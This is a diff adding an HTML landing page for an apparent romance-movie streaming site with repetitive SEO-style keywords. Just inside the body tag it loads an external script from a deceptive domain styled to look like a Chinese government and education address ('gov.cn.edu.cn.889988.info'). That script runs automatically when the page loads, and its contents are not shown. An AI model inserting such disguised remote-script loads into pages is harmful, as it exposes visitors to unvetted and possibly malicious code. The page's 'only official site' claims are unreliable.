@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网aqdy - 高清爱情电影在线观看</title>
+<meta name="keywords" content="爱情电影网aqdy, 爱情电影, aqdy, 在线观看, 爱情片">
+<meta name="description" content="爱情电影网aqdy（aiqingdianyingwangaqdy-app）提供最新最热的高清爱情电影在线观看，浪漫喜剧、虐恋悲剧一网打尽。">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+    font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+    color: #fff;
+    min-height: 100vh;
+    overflow-x: hidden;
+    position: relative;
+    background: #0a0a1a;
+}
+/* 粒子背景 */
+#particles {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: -1;
+}
+/* 导航 */
+.nav {
+    position: fixed;
+    top: 0; left: 0; right: 0;
+    background: rgba(10,10,26,0.7);
+    backdrop-filter: blur(10px);
+    z-index: 1000;
+    padding: 1rem 5%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    border-bottom: 1px solid rgba(255,255,255,0.1);
+}
+.logo {
+    font-size: 1.5rem;
+    font-weight: bold;
+    background: linear-gradient(45deg, #ff6b9d, #ffc0d0);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}
+.nav-links {
+    display: flex;
+    gap: 1.5rem;
+}
+.nav-links a {
+    color: rgba(255,255,255,0.8);
+    text-decoration: none;
+    font-size: 0.95rem;
+    transition: color 0.3s;
+}
+.nav-links a:hover { color: #ff6b9d; }
+/* 主视觉 */
+.hero {
+    margin-top: 80px;
+    padding: 4rem 5%;
+    text-align: center;
+    min-height: 80vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+}
+.hero h1 {
+    font-size: clamp(2rem, 5vw, 3.5rem);
+    margin-bottom: 1rem;
+    background: linear-gradient(45deg, #ff6b9d, #ffc0d0, #ff6b9d);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    animation: gradientShift 3s ease infinite;
+}
+@keyframes gradientShift {
+    0%,100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+}
+.hero p {
+    font-size: 1.1rem;
+    max-width: 600px;
+    margin-bottom: 2rem;
+    color: rgba(255,255,255,0.8);
+    line-height: 1.6;
+}
+.url-box {
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    padding: 0.8rem 1.5rem;
+    border-radius: 50px;
+    font-family: monospace;
+    font-size: 0.9rem;
+    color: #ffc0d0;
+    margin-bottom: 2rem;
+}
+.cta-btn {
+    padding: 0.8rem 2rem;
+    background: linear-gradient(45deg, #ff6b9d, #c53a7d);
+    border: none;
+    border-radius: 50px;
+    color: white;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: transform 0.3s, box-shadow 0.3s;
+    text-decoration: none;
+    display: inline-block;
+}
+.cta-btn:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 10px 20px rgba(255,107,157,0.3);
+}
+/* 栏目通用 */
+.section {
+    padding: 4rem 5%;
+    max-width: 1200px;
+    margin: 0 auto;
+}
+.section-title {
+    text-align: center;
+    font-size: 2rem;
+    margin-bottom: 3rem;
+    position: relative;
+}
+.section-title::after {
+    content: '';
+    display: block;
+    width: 60px;
+    height: 3px;
+    background: linear-gradient(45deg, #ff6b9d, #c53a7d);
+    margin: 0.5rem auto;
+    border-radius: 2px;
+}
+/* 卡片网格 */
+.grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 2rem;
+}
+.card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 16px;
+    padding: 2rem;
+    transition: transform 0.3s, background 0.3s;
+    backdrop-filter: blur(5px);
+}
+.card:hover {
+    transform: translateY(-5px);
+    background: rgba(255,255,255,0.08);
+}
+.card h3 {
+    color: #ffc0d0;
+    margin-bottom: 1rem;
+    font-size: 1.3rem;
+}
+.card p {
+    color: rgba(255,255,255,0.7);
+    line-height: 1.6;
+    margin-bottom: 1.5rem;
+}
+.card a {
+    color: #ff6b9d;
+    text-decoration: none;
+    font-weight: 500;
+}
+.card a:hover { text-decoration: underline; }
+/* 底部 */
+.footer {
+    text-align: center;
+    padding: 2rem;
+    border-top: 1px solid rgba(255,255,255,0.1);
+    margin-top: 4rem;
+    color: rgba(255,255,255,0.5);
+    font-size: 0.9rem;
+}
+/* 移动端 */
+@media (max-width: 768px) {
+    .nav { padding: 1rem; }
+    .nav-links { gap: 1rem; }
+    .nav-links a { font-size: 0.85rem; }
+    .hero { margin-top: 70px; padding: 2rem 1rem; }
+    .section { padding: 3rem 1rem; }
+    .grid { grid-template-columns: 1fr; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<canvas id="particles"></canvas>
+
+<nav class="nav">
+    <div class="logo">爱情电影网aqdy</div>
+    <div class="nav-links">
+        <a href="#home">首页</a>
+        <a href="#movies">热映影片</a>
+        <a href="#genres">影片分类</a>
+        <a href="#about">关于我们</a>
+    </div>
+</nav>
+
+<section class="hero" id="home">
+    <h1>爱情电影网aqdy</h1>
+    <p>你的专属浪漫观影空间，最新最热爱情电影一网打尽</p>
+    <div class="url-box">https://aiqingdianyingwangaqdy-app.github.io</div>
+    <a href="#" class="cta-btn">立即观影</a>
+</section>
+
+<section class="section" id="movies">
+    <h2 class="section-title">热映影片</h2>
+    <div class="grid">
+        <div class="card">
+            <h3>怦然心动</h3>
+            <p>经典青春爱情电影，讲述青梅竹马的成长与心动瞬间，纯真情感令人回味无穷。</p>
+            <a href="#">观看详情 →</a>
+        </div>
+        <div class="card">
+            <h3>泰坦尼克号</h3>
+            <p>永恒的经典，杰克与露丝跨越阶级的生死之恋，爱情电影网aqdy为你高清呈现。</p>
+            <a href="#">观看详情 →</a>
+        </div>
+        <div class="card">
+            <h3>你的名字</h3>
+            <p>跨越时空的唯美爱恋，画面与音乐双重震撼，浪漫至极的动画爱情佳作。</p>
+            <a href="#">观看详情 →</a>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="genres">
+    <h2 class="section-title">影片分类</h2>
+    <div class="grid">
+        <div class="card">
+            <h3>浪漫喜剧</h3>
+            <p>轻松搞笑又甜蜜的爱情故事，让你在欢笑中感受爱情的美好。</p>
+            <a href="#">浏览分类 →</a>
+        </div>
+        <div class="card">
+            <h3>虐恋悲剧</h3>
+            <p>刻骨铭心的爱情，催人泪下的情节，体验爱情中的痛与感动。</p>
+            <a href="#">浏览分类 →</a>
+        </div>
+        <div class="card">
+            <h3>青春校园</h3>
+            <p>那些年我们一起追过的女孩，重温校园时代的纯真与悸动。</p>
+            <a href="#">浏览分类 →</a>
+        </div>
+    </div>
+</section>
+
+<section class="section" id="about">
+    <h2 class="section-title">关于爱情电影网aqdy</h2>
+    <div class="grid">
+        <div class="card">
+            <h3>网站简介</h3>
+            <p>爱情电影网aqdy（aiqingdianyingwangaqdy-app）专注于提供高清爱情电影在线观看服务，涵盖浪漫喜剧、虐恋悲剧、青春校园等多种类型，满足你的观影需求。</p>
+            <a href="#">了解更多 →</a>
+        </div>
+        <div class="card">
+            <h3>访问地址</h3>
+            <p>请认准唯一官方网址：<br><strong>https://aiqingdianyingwangaqdy-app.github.io</strong></p>
+            <a href="#">收藏本站 →</a>
+        </div>
+        <div class="card">
+            <h3>更新日志</h3>
+            <p>每日更新最新爱情电影资源，优化播放体验，让你的观影之旅更加顺畅。</p>
+            <a href="#">查看详情 →</a>
+        </div>
+    </div>
+</section>
+
+<footer class="footer">
+    <p>© 2026 爱情电影网aqdy | 网址：https://aiqingdianyingwangaqdy-app.github.io</p>
+    <p>关键词：爱情电影网aqdy, 爱情电影, aqdy, 在线观看</p>
+</footer>
+
+<script>
+// 粒子背景
+const canvas = document.getElementById('particles');
+const ctx = canvas.getContext('2d');
+let w, h;
+let particles = [];
+
+function resize() {
+    w = canvas.width = window.innerWidth;
+    h = canvas.height = window.innerHeight;
+}
+window.addEventListener('resize', resize);
+resize();
+
+class Particle {
+    constructor() {
+        this.x = Math.random() * w;
+        this.y = Math.random() * h;
+        this.size = Math.random() * 2 + 0.5;
+        this.speedX = Math.random() * 0.5 - 0.25;
+        this.speedY = Math.random() * 0.5 - 0.25;
+        this.opacity = Math.random() * 0.5 + 0.2;
+    }
+    update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.x < 0 || this.x > w) this.speedX *= -1;
+        if (this.y < 0 || this.y > h) this.speedY *= -1;
+    }
+    draw() {
+        ctx.fillStyle = `rgba(255,192,208,${this.opacity})`;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+    }
+}
+
+function initParticles() {
+    particles = [];
+    const count = Math.floor(w / 10);
+    for (let i = 0; i < count; i++) {
+        particles.push(new Particle());
+    }
+}
+initParticles();
+
+function animate() {
+    ctx.clearRect(0, 0, w, h);
+    particles.forEach(p => {
+        p.update();
+        p.draw();
+    });
+    requestAnimationFrame(animate);
+}
+animate();
+</script>
+
+</body>
+</html>
